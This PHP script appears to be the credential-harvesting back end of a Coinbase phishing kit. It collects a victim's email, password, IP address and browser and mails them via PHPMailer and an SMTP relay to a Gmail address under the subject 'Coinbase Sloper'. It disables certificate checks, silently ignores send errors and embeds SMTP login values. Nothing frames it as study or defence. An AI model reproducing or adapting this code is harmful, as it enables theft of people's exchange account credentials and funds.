<?php
// Import PHPMailer classes into the global namespace
// These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

$back = "";

  $email = "test@gmail.com" ;
  $password =  "test" ;
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

//get browser 
function get_browser_name($user_agent){
    $t = strtolower($user_agent);
    $t = " " . $t;
    if     (strpos($t, 'opera'     ) || strpos($t, 'opr/')     ) return 'Opera'            ;   
    elseif (strpos($t, 'edge'      )                           ) return 'Edge'             ;   
    elseif (strpos($t, 'chrome'    )                           ) return 'Chrome'           ;   
    elseif (strpos($t, 'safari'    )                           ) return 'Safari'           ;   
    elseif (strpos($t, 'firefox'   )                           ) return 'Firefox'          ;   
    elseif (strpos($t, 'msie'      ) || strpos($t, 'trident/7')) return 'Internet Explorer';
    return 'Unkown';
}
$browser = get_browser_name($_SERVER['HTTP_USER_AGENT']);
//configure to your smtp
$smtphost = "smtp.mailtrap.io";
$smtpusername = "045bd2df912de5";
$smtppassword = "725056fd605cdf";
$smtpport = 2525;
$myemail = "gruabutech@gmail.com";
$message ="Email: ".$email.'<br/>'."Password:".$password.'<br/>'."Ip Address:".$ip.'<br/>'."Browser".$browser;
$subject ="Coinbase Sloper";


  //Load composer's autoloader
    require 'phpmailer/vendor/autoload.php';

    $mail = new PHPMailer(true);                              // Passing `true` enables exceptions
    try {
        //Server settings
        $mail->isSMTP();                                      // Set mailer to use SMTP
        $mail->Host =  $smtphost;                       // Specify main and backup SMTP servers
        $mail->SMTPAuth = true;                               // Enable SMTP authentication
        $mail->Username =  $smtpusername;     // Your Email/ Server Email
        $mail->Password =  $smtppassword;                     // Your Password
        $mail->SMTPOptions = array(
            'ssl' => array(
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
            )
        );                         
        $mail->SMTPSecure = 'ssl';                           
        $mail->Port =  $smtpport ;                                   

        //Send Email
        $mail->setFrom($smtpusername);
        
        //Recipients
        $mail->addAddress($myemail);              
        $mail->addReplyTo($smtpusername);
        
      
       
        //Content
        $mail->isHTML(true);                                  
        $mail->Subject = $subject;
        $mail->Body    = $message;

        $mail->send();
       
    } catch (Exception $e) {
      
    }

  



?>